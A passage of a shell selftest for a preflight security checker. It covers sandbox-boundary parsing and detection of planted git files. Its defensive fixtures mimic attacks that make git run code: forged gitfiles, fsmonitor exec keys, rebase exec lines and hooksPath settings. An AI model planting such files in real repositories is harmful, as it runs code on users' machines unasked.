  if [ "$_rm_plain" = 1 ]; then echo "PASS: run-env-miss-plain a missing recorded name moves miss to 1 on a plain run"; else echo "FAIL: run-env-miss-plain miss is '$_rm_plain', expected 1"; fail=1; fi
  if [ "$_rm_adv" = 0 ]; then echo "PASS: run-env-miss-advisory a missing recorded name leaves miss at 0 under --boundary-advisory"; else echo "FAIL: run-env-miss-advisory miss is '$_rm_adv', expected 0"; fail=1; fi
  _re_names() {  # [NAME=value ...] -> _re_nout: what incept would record, from a clean slate
    _re_nout=$(env -u CLAUDE_CONFIG_DIR -u GH_CONFIG_DIR -u GIT_CONFIG_GLOBAL -u GIT_CONFIG_NOSYSTEM -u XDG_CONFIG_HOME "$@" sh "$_sd/incept.sh" __run-env-names 2>&1) || true
  }
  _re_eq() { if [ "$_re_nout" = "$2" ]; then echo "PASS: $1: $3"; else echo "FAIL: $1: $3 (got '$_re_nout')"; fail=1; fi; }
  if [ -f "$_sd/incept.sh" ]; then
    _re_names CLAUDE_CONFIG_DIR=/sentinel/c; _re_eq run-env-names "CLAUDE_CONFIG_DIR" "CLAUDE_CONFIG_DIR alone is recorded"
    _re_names XDG_CONFIG_HOME=/sentinel/x; _re_eq run-env-names "" "XDG_CONFIG_HOME alone records nothing"
    _re_names GIT_CONFIG_NOSYSTEM=1; _re_eq run-env-names "" "GIT_CONFIG_NOSYSTEM alone records nothing"
    _re_names GH_CONFIG_DIR= ; _re_eq run-env-names "" "an empty trigger records nothing"
    _re_names GIT_CONFIG_NOSYSTEM=1 GH_CONFIG_DIR=/sentinel/g; _re_eq run-env-names "$(printf 'GH_CONFIG_DIR\nGIT_CONFIG_NOSYSTEM')" "GIT_CONFIG_NOSYSTEM rides along when a trigger is set"
  else
    echo "PASS: (skip) run-env names cells: no scripts/incept.sh beside this script"
  fi

  # ---- security triage at d0a955ac: exactly one document, a regular file, and a banner on seam runs.
  # A two-document file (`jq -c` prints one line per document, rc 0) and an empty or whitespace-only file are unreadable, never the first document / "no keys".
  { cat "$_bnd/full.json"; printf '{}\n'; } > "$_bnd/twodoc.json"
  : > "$_bnd/empty.json"; printf '  \n\n' > "$_bnd/blank.json"
  for _td in twodoc empty blank; do
    out=$( boundary_read_scope "$_bnd/$_td.json" )
    if [ "$out" = unreadable ]; then echo "PASS: boundary [one-document-$_td-scope] reads as exactly one line: unreadable"; else echo "FAIL: boundary [one-document-$_td-scope] expected 'unreadable' ($out)"; fail=1; fi
    bnd_case "$_bnd/$_td.json"
    bnd_has "one-document-$_td" 'warn boundary: UNVERIFIED'
    bnd_no "one-document-$_td" 'boundary: ON'
  done
  _sc "$_bnd/twodoc.json" "" "" "" @absent ""
  _bnd_kill one-document-check-deleted '/in   # MUT-ONEDOC$/,/^  esac$/d' "--boundary-only --boundary-advisory" has 'warn boundary: UNVERIFIED'
  # SWAS-793: bwarn counts the boundary's notices (its WARN lines and its lowercase warn lines) for the summary line, and nothing else moves. Like the accumulator cell above, one direct
  # check_boundary call in a subshell with the seams, printing bwarn: a DECLARED opt-out is one WARN (1), a boundary scope that cannot be read is one `warn boundary: UNVERIFIED` (1), and an
  # UNDECLARED opt-out is a FAIL line, which is no notice (0). A third argument loads boundary_judge from a mutated copy of this script, so the mutant below changes only the site it names.
  _bwcell() {  # <project> <declaration seam> [mutated copy of this script] -> bwarn after one check_boundary call (CI and the marker cleared)
    ( unset CI GITHUB_ACTIONS SANDBOX_RUNTIME
      [ -z "${3:-}" ] || eval "$(sed -n '/^boundary_judge() {/,/^}/p' "$3")"
      miss=0; rec=0; bfail=0; bunv=0; bwarn=0
      PREFLIGHT_SANDBOX_SETTINGS="$1"; PREFLIGHT_SANDBOX_LOCAL=/nonexistent-local; PREFLIGHT_SANDBOX_USER=/nonexistent-user; PREFLIGHT_SANDBOX_MANAGED=/nonexistent-managed; PREFLIGHT_BOUNDARY_OPTOUT="$2"
      PREFLIGHT_SANDBOX_OS=Darwin; PREFLIGHT_SANDBOX_TOOLS=sandbox-exec; PREFLIGHT_SANDBOX_BWRAP_OK=1
      export PREFLIGHT_SANDBOX_SETTINGS PREFLIGHT_SANDBOX_LOCAL PREFLIGHT_SANDBOX_USER PREFLIGHT_SANDBOX_MANAGED PREFLIGHT_BOUNDARY_OPTOUT PREFLIGHT_SANDBOX_OS PREFLIGHT_SANDBOX_TOOLS PREFLIGHT_SANDBOX_BWRAP_OK
      check_boundary >/dev/null 2>&1
      printf '%s' "$bwarn" )
  }
  for _bw in "declared-warn|$_bnd/off.json|$_bnd/d-all.conf|1" "unreadable-scope-warn|$_bnd/twodoc.json|@absent|1" "undeclared-is-a-fail|$_bnd/off.json|@absent|0"; do
    _bwl=$(printf '%s' "$_bw" | cut -d'|' -f1); _bww=$(printf '%s' "$_bw" | cut -d'|' -f4)
    _bwg=$(_bwcell "$(printf '%s' "$_bw" | cut -d'|' -f2)" "$(printf '%s' "$_bw" | cut -d'|' -f3)")
    if [ "$_bwg" = "$_bww" ]; then echo "PASS: swas-793 [bwarn-$_bwl] one check_boundary call counts bwarn = $_bwg"; else echo "FAIL: swas-793 [bwarn-$_bwl] expected bwarn '$_bww', got '$_bwg'"; fail=1; fi
  done
  # mutant bwarn-decl-dropped: the increment after the declared opt-out's WARN line is deleted from a copy, and the declared scenario must then read 0 (the original reads 1).
  if _pr_mut bwarn-decl-dropped '/^ *bwarn=\$((\${bwarn:-0} + 1)) *# MUT-BWARN:/d'; then
    _bwm=$(_bwcell "$_bnd/off.json" "$_bnd/d-all.conf" "$_pr_mp")
    case "$_bwm" in
      0) echo "PASS: mutant bwarn-decl-dropped is killed (the declared opt-out counts 0)" ;;
      1) echo "FAIL: mutant bwarn-decl-dropped survived (the declared opt-out still counts 1)"; fail=1 ;;
      *) echo "FAIL: mutant bwarn-decl-dropped never ran the declared scenario (vacuous: '$_bwm')"; fail=1 ;;
    esac
  fi
  # DC20 follows the same rule: a jq that prints two lines for the WebFetch read (rc 0) reads as unreadable, never a listing (a two-document local file is already
  # refused by the scope read, so the guard is proved with a PATH-stub jq).
  _j2=$(mktemp -d)
  printf '%s\n' '#!/bin/sh' 'case "$*" in' "  *'WebFetch(domain:'*) echo \"1 example.org\"; echo \"1 example.net\"; exit 0 ;;" 'esac' "exec $(command -v jq) \"\$@\"" > "$_j2/jq"; chmod +x "$_j2/jq"
  _sc "$_bnd/full.json" "$_bnd/user-plain.json" "$_bnd/local-wf1.json" "" @absent ""; _g_path="$_j2"
  _bnd_run "$_self" "--boundary-only --boundary-advisory"
  case "$_br_out" in
    *"could not be read for saved WebFetch"*) echo "PASS: one-document [dc20] a two-line jq result reads as one UNVERIFIED line" ;;
    *) echo "FAIL: one-document [dc20] a two-line jq result was listed ($_br_out)"; fail=1 ;;
  esac
  _bnd_kill dc20-multiline-accepted '/in   # MUT-DC20NL$/,/^  esac$/d' "--boundary-only --boundary-advisory" has 'could not be read for saved WebFetch'
  _g_path=""; rm -rf "$_j2"
  # A non-regular scope (a FIFO with no writer) must read UNVERIFIED promptly. Opening a FIFO that nothing writes blocks in open() and spins nothing, so the fixture needs no
  # kill (S3): a run that has not finished by the deadline is RELEASED (a read-write open of the FIFO wakes a reader blocked in open(), which then reads EOF), and the
  # missed deadline is the failure. A bounded tree-kill, children first (R1: dash refuses `set -m` with no tty, so a process-group kill is not portable), is the belt only,
  # and the job carries a CPU cap (ulimit -t) so a runaway cannot spin past it.
  # S11: best-effort belt only: with no pgrep just the parent is signalled, and the signal is TERM, so a child that ignores it can outlive the run.
  _bnd_killtree() {  # <pid>: children first, then the parent
    for _kt_c in $(pgrep -P "$1" 2>/dev/null); do _bnd_killtree "$_kt_c"; done
    kill -TERM "$1" 2>/dev/null || true
  }
  _bnd_timed() {  # <script> <project settings> <seconds> -> _bt_out, _bt_hung (1 = it had not finished by the deadline)
    _bt_f=$(mktemp); rm -f "$_bt_f.done"; _bt_hung=0
    # shellcheck disable=SC3045  # selftest-only best-effort CPU cap; a shell without ulimit -t falls through via || true
    { ulimit -t 30 2>/dev/null || true
      env -u CI -u GITHUB_ACTIONS -u SANDBOX_RUNTIME PREFLIGHT_SANDBOX_SETTINGS="$2" PREFLIGHT_SANDBOX_LOCAL=/nonexistent-local PREFLIGHT_SANDBOX_USER=/nonexistent-user PREFLIGHT_SANDBOX_MANAGED=/nonexistent-managed PREFLIGHT_SANDBOX_OS=Darwin PREFLIGHT_SANDBOX_TOOLS=sandbox-exec PREFLIGHT_SANDBOX_BWRAP_OK=1 PREFLIGHT_BOUNDARY_OPTOUT=@absent sh "$1" --selftest-e2e --boundary-only --boundary-advisory; : > "$_bt_f.done"; } > "$_bt_f" 2>&1 &
    _bt_p=$!
    _bt_n=0
    while [ ! -e "$_bt_f.done" ] && [ "$_bt_n" -lt "$3" ]; do sleep 1; _bt_n=$((_bt_n + 1)); done
    if [ ! -e "$_bt_f.done" ]; then
      _bt_hung=1
      _bt_r=0
      while [ ! -e "$_bt_f.done" ] && [ "$_bt_r" -lt 12 ]; do ( exec 3<> "$2"; exec 3>&- ) 2>/dev/null; sleep 1; _bt_r=$((_bt_r + 1)); done   # release, no kill
      if [ ! -e "$_bt_f.done" ]; then _bnd_killtree "$_bt_p"; fi   # the belt
    fi
    wait "$_bt_p" 2>/dev/null || true
    _bt_out=$(cat "$_bt_f"); rm -f "$_bt_f" "$_bt_f.done"
  }
  mkfifo "$_bnd/zero.json"
  _bnd_timed "$_self" "$_bnd/zero.json" 15
  case "$_bt_out" in
    *"warn boundary: UNVERIFIED"*) if [ "$_bt_hung" -eq 0 ]; then echo "PASS: non-regular-scope a FIFO scope reads UNVERIFIED promptly"; else echo "FAIL: non-regular-scope the run had to be released"; fail=1; fi ;;
    *) echo "FAIL: non-regular-scope no UNVERIFIED line (hung=$_bt_hung): $_bt_out"; fail=1 ;;
  esac
  _bm=$(mktemp -d); sed '/return 0; }   # MUT-ISFILE$/d' "$_self" > "$_bm/preflight.sh"
  if cmp -s "$_self" "$_bm/preflight.sh"; then echo "FAIL: mutant regular-file-check-deleted did not apply"; fail=1
  elif ! sh -n "$_bm/preflight.sh" 2>/dev/null; then echo "FAIL: mutant regular-file-check-deleted does not parse"; fail=1
  else
    _bnd_timed "$_bm/preflight.sh" "$_bnd/zero.json" 4
    if [ "$_bt_hung" -eq 1 ]; then echo "PASS: mutant regular-file-check-deleted is killed (the run blocks opening the FIFO and misses the deadline)"; else echo "FAIL: mutant regular-file-check-deleted survived (it did not hang)"; fail=1; fi
  fi
  rm -rf "$_bm"
  # The seam banner: a run with the test seams live says so on its first line; a plain --selftest run does not print it into cells' captured output.
  _sc "$_bnd/full.json" "$_bnd/user-strict.json" "" "" @absent ""
  _bnd_run "$_self" "--boundary-only --boundary-advisory"
  case "$_br_out" in
    "NOTE: test seams live — not a report on this machine"*) echo "PASS: seam-banner a seam run opens with the NOTE line" ;;
    *) echo "FAIL: seam-banner the first line is not the NOTE ($_br_out)"; fail=1 ;;
  esac
  _bnd_kill seam-banner-dropped '/MUT-BANNER/s/echo "NOTE[^"]*"/:/' "--boundary-only --boundary-advisory" has 'NOTE: test seams live'

  # ---- SWAS-487: the one-cell selector. `--selftest --selftest-cell case-variant` runs ONLY the case-variant cell (the lane's cell, N/A on Linux, runs it instead of the whole selftest
  # five times). Graded here so Linux CI proves cell mode runs the cell, that its trailer cannot satisfy a consumer of the full selftest's, and that the selector is flag-only.
  _cvx_full_ok() {  # <script file>: rc 0 iff exactly one `st_case_variant   # MUT-CVFULL` call line sits after the s27 not-own-root cell
    awk '/s27 \[not-own-root --allow-nested\]/ { if (!m) m = NR } /^ *st_case_variant   # MUT-CVFULL$/ { n++; at = NR } END { exit !(n == 1 && m > 0 && at > m) }' "$1"
  }
  _cvx_init_ok() {  # <script file>: rc 0 iff the flag-init line holds SELFTEST_CELL="" (FLAG-NOT-ENV: an exported value must never reach the flag variable)
    awk '/^STACK=""; SELFTEST=0;/ { if (index($0, "SELFTEST_CELL=\"\"")) ok = 1 } END { exit !ok }' "$1"
  }
  _cvx_sm() {  # <name> <sed expr> <check fn>: a COPY mutated by the expression must fail the structural check
    _cvxm=$(mktemp -d); sed "$2" "$_self" > "$_cvxm/preflight.sh"
    if cmp -s "$_self" "$_cvxm/preflight.sh"; then echo "FAIL: mutant $1 did not apply (the sed expression matched nothing)"; fail=1
    elif "$3" "$_cvxm/preflight.sh"; then echo "FAIL: mutant $1 survived"; fail=1
    else echo "PASS: mutant $1 is killed"; fi
    rm -rf "$_cvxm"
  }
  _cvx_cell() {  # <script> -> _cvx_out, _cvx_rc: the one-cell run
    _cvx_rc=0; _cvx_out=$(sh "$1" --selftest --selftest-cell case-variant 2>&1) || _cvx_rc=$?
  }
  _cvx_trailer_ok() {  # <output>: rc 0 iff it holds none of the full selftest's trailer substring (a consumer needs exit 0 and the whole line) and one cell trailer
    [ "$(printf '%s\n' "$1" | grep -c 'OK: preflight selftest' || true)" -eq 0 ] && [ "$(printf '%s\n' "$1" | grep -c 'OK: preflight cell case-variant (not the full selftest)' || true)" -eq 1 ]
  }
  _cvx_rc2() {  # <label> <message substring> <args...>: the parser refuses with rc 2 and the flag's OWN message (the old parser also exits 2 for an unknown arg)
    _cvx_l=$1; _cvx_w=$2; shift 2; _cvx_r=0; _cvx_o=$(sh "$_self" "$@" 2>&1) || _cvx_r=$?
    case "$_cvx_o" in
      *"$_cvx_w"*) if [ "$_cvx_r" -eq 2 ]; then echo "PASS: cell flag [$_cvx_l] exits 2 with its own message"; else echo "FAIL: cell flag [$_cvx_l] exited $_cvx_r, expected 2"; fail=1; fi ;;
      *) echo "FAIL: cell flag [$_cvx_l] did not print '$_cvx_w' (rc $_cvx_r: $_cvx_o)"; fail=1 ;;
    esac
  }
  _cvx_cell "$_self"
  _cvx_n=$(printf '%s\n' "$_cvx_out" | grep -c 'owns_itself \[case-variant-cd\]' || true)
  # No message below quotes the full selftest's trailer text or echoes the cell's output: this run's own output must hold that text only on its real final line (SWAS-487 I1).
  if [ "$_cvx_rc" -eq 0 ] && [ "$_cvx_n" -eq 1 ]; then echo "PASS: cell mode [liveness] --selftest-cell case-variant exits 0 and prints exactly one owns_itself [case-variant-cd] line"; else echo "FAIL: cell mode [liveness] rc $_cvx_rc, $_cvx_n owns_itself line(s)"; fail=1; fi
  if _cvx_trailer_ok "$_cvx_out"; then echo "PASS: cell mode [trailer] the output holds none of the full selftest's trailer text and one cell trailer"; else echo "FAIL: cell mode [trailer] the output holds the full selftest's trailer text or not exactly one cell trailer"; fail=1; fi
  _cvxm=$(mktemp -d); sed '/# MUT-CVTRAILER$/s/OK: preflight cell case-variant (not the full selftest)/OK: preflight selftest/' "$_self" > "$_cvxm/preflight.sh"
  if cmp -s "$_self" "$_cvxm/preflight.sh"; then echo "FAIL: mutant cvtrailer-is-the-full-trailer did not apply"; fail=1
  elif ! sh -n "$_cvxm/preflight.sh" 2>/dev/null; then echo "FAIL: mutant cvtrailer-is-the-full-trailer does not parse"; fail=1
  else
    _cvx_cell "$_cvxm/preflight.sh"
    if _cvx_trailer_ok "$_cvx_out"; then echo "FAIL: mutant cvtrailer-is-the-full-trailer survived"; fail=1; else echo "PASS: mutant cvtrailer-is-the-full-trailer is killed"; fi
  fi
  rm -rf "$_cvxm"
  _cvx_rc2 missing-value "--selftest-cell requires a cell name" --selftest --selftest-cell
  _cvx_rc2 empty-value "--selftest-cell requires a cell name" --selftest --selftest-cell ''
  _cvx_rc2 flag-as-value "--selftest-cell requires a cell name" --selftest-cell --selftest
  _cvx_rc2 unknown-name "--selftest-cell requires a cell name" --selftest --selftest-cell no-such-cell
  _cvx_rc2 without-selftest "--selftest-cell requires --selftest" --selftest-cell case-variant
  # an exported SELFTEST_CELL is ignored: --selftest would recurse without end, so this uses --selftest-e2e; a leak would hit the "without --selftest" refusal (rc 2)
  _g_proj="$_bnd/off.json"; _g_user=""; _g_decl=@absent; _g_dir=""; _g_env=SELFTEST_CELL=case-variant
  _bnd_run "$_self" "--boundary-only --boundary-advisory"
  if [ "$_br_rc" -eq 0 ]; then echo "PASS: cell flag [env-inert] an exported SELFTEST_CELL does not reach the flag (exit 0)"; else echo "FAIL: cell flag [env-inert] exited $_br_rc ($_br_out)"; fail=1; fi
  _bnd_kill cvinit-deleted '/^STACK=""; SELFTEST=0;/s/; SELFTEST_CELL=""//' "--boundary-only --boundary-advisory" rc 0
  _g_env=""
  if _cvx_init_ok "$_self"; then echo "PASS: cell flag [init] SELFTEST_CELL is initialised on the flag-init line"; else echo "FAIL: cell flag [init] the flag-init line does not initialise SELFTEST_CELL"; fail=1; fi
  _cvx_sm cvinit-structural '/^STACK=""; SELFTEST=0;/s/; SELFTEST_CELL=""//' _cvx_init_ok
  if _cvx_full_ok "$_self"; then echo "PASS: cell call [full-run] the full run calls st_case_variant exactly once, after the s27 not-own-root cell"; else echo "FAIL: cell call [full-run] not exactly one 'st_case_variant   # MUT-CVFULL' call after the s27 cell"; fail=1; fi
  _cvx_sm cvfull-call-deleted '/^ *st_case_variant   # MUT-CVFULL$/d' _cvx_full_ok

  # ---- SWAS-473 C1 (check_git_plants): GP1-GP50 (numbers are labels, not a sequence). One negative per attack shape on fixture trees under a private temp dir; every host git act carries the safety flags and a fixture HOME;
  # each starred cell carries a mutant (a sed cut of a COPY of this script, never an environment switch). C1 itself is run through `--git-plants-only`.
  _gp_t=$(mktemp -d)
  _gp_g() { env -i PATH="$PATH" HOME="$_gp_t" GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null git -c user.name=k -c user.email=k@example.invalid -c commit.gpgsign=false -c core.hooksPath=/dev/null -c core.fsmonitor=false "$@"; }
  _gp_repo() {  # <name>: a fresh repository root with one commit (echoed through _gp_d)
    _gp_d="$_gp_t/$1"; rm -rf "$_gp_d"; mkdir -p "$_gp_d"; printf a > "$_gp_d/f"
    _gp_g -C "$_gp_d" init -q . >/dev/null 2>&1; _gp_g -C "$_gp_d" add f >/dev/null 2>&1; _gp_g -C "$_gp_d" commit -q -m s >/dev/null 2>&1
  }
  _gp_run() {  # <dir> [script] [path prefix]: C1 in <dir>; sets _gp_o and _gp_rc
    _gp_rc=0
    _gp_o=$( cd "$1" && env PATH="${3:+$3:}$PATH" sh "${2:-$_self}" --git-plants-only 2>&1 ) || _gp_rc=$?
  }
  _gp_tr() {  # <dir> <script>: C1 under a 12 s watchdog (a FIFO named .git must never be opened); sets _gp_o and _gp_hung
    _gp_f="$_gp_t/tr.out"; _gp_hung=0
    ( cd "$1" && exec sh "$2" --git-plants-only ) >"$_gp_f" 2>&1 &
    _gp_pid=$!; _gp_n=0
    while kill -0 "$_gp_pid" 2>/dev/null; do
      if [ "$_gp_n" -ge 12 ]; then kill "$_gp_pid" 2>/dev/null; _gp_hung=1; break; fi
      sleep 1; _gp_n=$((_gp_n + 1))
    done
    wait "$_gp_pid" 2>/dev/null || :
    _gp_ff=${3:-$1/d1/.git}
    if [ "$_gp_hung" -eq 1 ] && [ -p "$_gp_ff" ]; then ( exec 3<>"$_gp_ff" ) 2>/dev/null || :; fi   # release the orphaned reader
    _gp_o=$(cat "$_gp_f")
  }
  _gp_has() { case "$_gp_o" in *"$2"*) echo "PASS: git-plants [$1] $3" ;; *) echo "FAIL: git-plants [$1] the report lacks '$2' ($_gp_o)"; fail=1 ;; esac; }
  _gp_no() { case "$_gp_o" in *"$2"*) echo "FAIL: git-plants [$1] the report holds '$2' ($_gp_o)"; fail=1 ;; *) echo "PASS: git-plants [$1] $3" ;; esac; }
  _gp_kill() {  # <name> <sed expr> <dir> <needle> [appears]: the mutant's report must lose the needle (or, with 'appears', gain it)
    _gk=$(mktemp -d); sed "$2" "$_self" > "$_gk/preflight.sh"
    if cmp -s "$_self" "$_gk/preflight.sh"; then echo "FAIL: mutant $1 did not apply (the sed expression matched nothing)"; fail=1
    elif ! sh -n "$_gk/preflight.sh" 2>/dev/null; then echo "FAIL: mutant $1 does not parse"; fail=1
    else
      _gp_tr "$3" "$_gk/preflight.sh" "${6:-}"
      case "$_gp_o:${5:-lost}" in
        *"$4"*:lost) echo "FAIL: mutant $1 survived (the report still holds the finding)"; fail=1 ;;
        *"$4"*:appears) echo "PASS: mutant $1 is killed (the forged text reached the report)" ;;
        *:appears) echo "FAIL: mutant $1 survived (nothing forged reached the report)"; fail=1 ;;
        *) echo "PASS: mutant $1 is killed" ;;
      esac
    fi
    rm -rf "$_gk"
  }
  mkdir -p "$_gp_t/stub"; printf '#!/bin/sh\nprintf x > "%s/GITRAN"\nexit 0\n' "$_gp_t" > "$_gp_t/stub/git"; chmod 755 "$_gp_t/stub/git"
  # GP1-GP4: an unregistered .git (a gitfile at depths 1 and 2, a symlink, a directory with an exec key, the upper-case spelling)
  _gp_repo gp1; mkdir -p "$_gp_d/d1/d2"; printf 'gitdir: %s/elsewhere\n' "$_gp_t" > "$_gp_d/d1/.git"; printf 'gitdir: %s/elsewhere\n' "$_gp_t" > "$_gp_d/d1/d2/.git"
  _gp_run "$_gp_d"; _gp_has GP1 "warn git-plants: ./d1/.git: unregistered .git file" "a gitfile at depth 1 is reported"
  _gp_has GP1b "warn git-plants: ./d1/d2/.git: unregistered .git file" "a gitfile at depth 2 is reported"
  _gp_no GP1c "$_gp_t/elsewhere" "the gitfile's content (its target) is never printed"
  _gp_gp1=$_gp_d; _gp_gp1rc=$_gp_rc
  _gp_kill GP1-nest-accept-all '/# MUT-GPNEST$/s/.*/  return 0/' "$_gp_gp1" "unregistered .git file"
  _gp_repo gp2; mkdir -p "$_gp_d/d1"; ln -s "$_gp_t/elsewhere" "$_gp_d/d1/.git"
  _gp_run "$_gp_d"; _gp_has GP2 "./d1/.git: unregistered .git symlink" "a .git symlink is reported"
  _gp_repo gp3; mkdir -p "$_gp_d/d1/.git"; printf '[core]\n\tfsmonitor = /bin/true\n' > "$_gp_d/d1/.git/config"
  _gp_run "$_gp_d"; _gp_has GP3 "./d1/.git: unregistered .git directory" "a .git directory is reported"
  _gp_has GP3b "[core.fsmonitor]" "its exec key is named"
  _gp_no GP3c "/bin/true" "its value is never printed"
  _gp_repo gp4; mkdir -p "$_gp_d/d1"; printf 'gitdir: x\n' > "$_gp_d/d1/.GIT"
  _gp_run "$_gp_d"; _gp_has GP4 "./d1/.GIT: unregistered .git file" "the upper-case spelling is walked (-iname)"
  # GP17 and GP5: a registered submodule is silent and prints the exact row (Q4); its rewritten gitfile is reported
  _gp_repo gp5src; _gp_src=$_gp_d
  _gp_repo gp5; _gp_g -C "$_gp_d" -c protocol.file.allow=always submodule add -q "$_gp_src" sub >/dev/null 2>&1; _gp_g -C "$_gp_d" commit -q -m sub >/dev/null 2>&1
  _gp_run "$_gp_d"; _gp_no GP17 "warn git-plants" "a registered submodule raises no warning"
  _gp_has GP17b 'denyWrite "./sub/.git" and permissions.deny "Edit(./sub/.git)"' "its exact row is printed (the measured row, Q4)"
  _gp_gp17=$_gp_d
  _gp_kill GP17-row-trailing-slash '/# MUT-GPROW$/s#denyWrite \\"\$1\\"#denyWrite \\"\$1/\\"#' "$_gp_gp17" 'denyWrite "./sub/.git"'
  printf 'gitdir: %s/elsewhere\n' "$_gp_t" > "$_gp_d/sub/.git"
  _gp_run "$_gp_d"; _gp_has GP5 "registered submodule's gitfile is not one plain line naming a directory under ./.git/modules" "a registered gitfile naming another directory is reported"
  _gp_gp5=$_gp_d
  _gp_kill GP5-sub-accept-any '/# MUT-GPSUB$/s#"\$gp_rootp"/\.git/modules/?\*)#*)#' "$_gp_gp5" "naming a directory under ./.git/modules"
  printf 'gitdir: ../.git/modules/sub\nsecond line\n' > "$_gp_d/sub/.git"
  _gp_run "$_gp_d"; _gp_has GP5b "naming a directory under ./.git/modules" "a registered gitfile of two lines is refused whole (git parses the whole file)"
  printf 'gitdir: ../.git/modules/sub/../../../elsewhere\n' > "$_gp_d/sub/.git"
  _gp_run "$_gp_d"; _gp_has GP5c "naming a directory under ./.git/modules" "a registered gitfile that string-matches ../.git/modules/ but resolves elsewhere is refused"
  # GP6: ./.git/commondir is reported and then NO git runs at all (a stub git on PATH records any call)
  _gp_repo gp6; printf '%s\n' "$_gp_t/elsewhere" > "$_gp_d/.git/commondir"; rm -f "$_gp_t/GITRAN"
  _gp_run "$_gp_d" "$_self" "$_gp_t/stub"; _gp_has GP6 "./.git/commondir exists (P6)" "a main-repository commondir is reported"
  if [ ! -e "$_gp_t/GITRAN" ]; then echo "PASS: git-plants [GP6b] no git ran after the commondir finding"; else echo "FAIL: git-plants [GP6b] git ran after the commondir finding"; fail=1; fi
  _gp_gp6=$_gp_d
  _gk=$(mktemp -d); sed '/# MUT-GPNOGIT$/s/gp_nogit=1/gp_nogit=0/' "$_self" > "$_gk/preflight.sh"
  if cmp -s "$_self" "$_gk/preflight.sh"; then echo "FAIL: mutant GP6-nogit-dropped did not apply"; fail=1
  else
    rm -f "$_gp_t/GITRAN"; _gp_run "$_gp_gp6" "$_gk/preflight.sh" "$_gp_t/stub"
    if [ -e "$_gp_t/GITRAN" ]; then echo "PASS: mutant GP6-nogit-dropped is killed (git ran after the commondir finding)"; else echo "FAIL: mutant GP6-nogit-dropped survived"; fail=1; fi
  fi
  rm -rf "$_gk"
  # GP18, GP7b, GP8: a nested gitfile naming ./.git/worktrees/<one name> is an info and the run reads unverified, never ok (the back-link is not read: an agent can forge it); a commondir that is not ../.. and a config.worktree exec key are reported
  _gp_repo gp18; mkdir -p "$_gp_d/.claude"; _gp_g -C "$_gp_d" worktree add -q .claude/worktrees/w -b w >/dev/null 2>&1
  _gp_run "$_gp_d"; _gp_has GP18 "info git-plants: ./.claude/worktrees/w/.git: names ./.git/worktrees/<one name>" "a worktree gitfile is an info line that says it cannot tell a worktree from a plant"
  _gp_no GP18b "warn git-plants" "and raises no warning"
  _gp_has GP18c "unverified git-plants: a nested .git file names a worktree entry" "and the run prints its own unverified line (the one line doctor's gate exempts)"
  _gp_no GP18d "ok   git-plants" "and never reads as nothing found"
  _gp_gp18=$_gp_d
  _gp_kill GP18-info-dropped '/# MUT-GPWT$/s/gp_i "/: "/' "$_gp_gp18" "names ./.git/worktrees/<one name>"
  _gp_kill GP18-unverified-dropped '/# MUT-GPWT$/s/gp_cant=1/:/' "$_gp_gp18" "unverified git-plants: a nested .git file names a worktree entry"
  _gp_repo gp7b; _gp_g -C "$_gp_d" worktree add -q wt -b wt >/dev/null 2>&1; printf '../x\n' > "$_gp_d/.git/worktrees/wt/commondir"
  _gp_run "$_gp_d"; _gp_has GP7b "commondir is not ../.." "a worktree commondir that is not ../.. is reported"
  _gp_repo gp8; _gp_g -C "$_gp_d" worktree add -q wt -b wt >/dev/null 2>&1; printf '[core]\n\tfsmonitor = x\n' > "$_gp_d/.git/worktrees/wt/config.worktree"
  _gp_run "$_gp_d"; _gp_has GP8 "config.worktree sets key(s) that run a program" "a config.worktree exec key is reported"
  # GP9: submodule git directories (a commondir, an exec key in a module config)
  _gp_repo gp9; mkdir -p "$_gp_d/.git/modules/m" "$_gp_d/.git/modules/n/objects"
  printf x > "$_gp_d/.git/modules/m/commondir"; printf 'ref: refs/heads/main\n' > "$_gp_d/.git/modules/n/HEAD"; printf '[core]\n\tfsmonitor = x\n' > "$_gp_d/.git/modules/n/config"
  _gp_run "$_gp_d"; _gp_has GP9 "./.git/modules/m/commondir exists (P7)" "a module commondir is reported"
  _gp_has GP9b "./.git/modules/n/config sets key(s)" "a module config exec key is reported"
  # GP10-GP13: a bare layout, a gitfile ./.git, a pending exec line, info/exclude
  _gp_repo gp10; mkdir -p "$_gp_d/bare1/objects" "$_gp_d/bare1/refs"; printf 'ref: refs/heads/main\n' > "$_gp_d/bare1/HEAD"
  _gp_run "$_gp_d"; _gp_has GP10 "./bare1 is a bare repository layout (P8)" "a bare layout is reported"
  _gp_has GP10b "safe.bareRepository explicit" "with the C2 advice"
  rm -rf "$_gp_t/gp11"; mkdir -p "$_gp_t/gp11"; printf 'gitdir: ../elsewhere\n' > "$_gp_t/gp11/.git"
  _gp_run "$_gp_t/gp11"; _gp_has GP11 "info git-plants: ./.git is a gitfile (P9)" "a gitfile ./.git is an info line"
  _gp_no GP11b "warn git-plants" "and raises no warning"
  _gp_has GP11c "unverified git-plants" "and says UNVERIFIED, a distinct verdict"
  _gp_no GP11d "ok   git-plants" "and never claims nothing was found"
  _gp_gp11=$_gp_t/gp11
  _gp_kill GP11-unv-dropped '/# MUT-GPUNV$/s/printf .%s\\n. "  unverified/: "  unverified/' "$_gp_gp11" "unverified git-plants"
  _gp_repo gp12; mkdir -p "$_gp_d/.git/rebase-merge"; printf 'pick abc\nexec echo KITSECRETLINE\n' > "$_gp_d/.git/rebase-merge/git-rebase-todo"
  _gp_run "$_gp_d"; _gp_has GP12 "git-rebase-todo holds an exec line (P10)" "a pending exec line is reported by file name"
  _gp_no GP12b "KITSECRETLINE" "and the line is never printed"
  _gp_repo gp13; printf '*.log\nsecret/\n' >> "$_gp_d/.git/info/exclude"
  _gp_run "$_gp_d"; _gp_has GP13 "info git-plants: ./.git/info/exclude holds 2 pattern line(s)" "info/exclude is an info line with a count"
  # GP14, GP15: core.hooksPath inside the checkout; an exec key in ./.git/config
  _gp_repo gp14; _gp_g -C "$_gp_d" config core.hooksPath .husky
  _gp_run "$_gp_d"; _gp_has GP14 "core.hooksPath in ./.git/config points inside this checkout (P13)" "a hooksPath inside the checkout is reported"
  _gp_gp14=$_gp_d
  _gp_kill GP14-hookspath-outside '/# MUT-GPHOOKS$/s/\*) return 0 ;; esac/*) return 1 ;; esac/' "$_gp_gp14" "points inside this checkout"
  _gp_g -C "$_gp_d" config core.hooksPath '~nosuchuser/hooks'
  _gp_run "$_gp_d"; _gp_has GP14c "points inside this checkout" "a ~user value that cannot be resolved counts as inside"
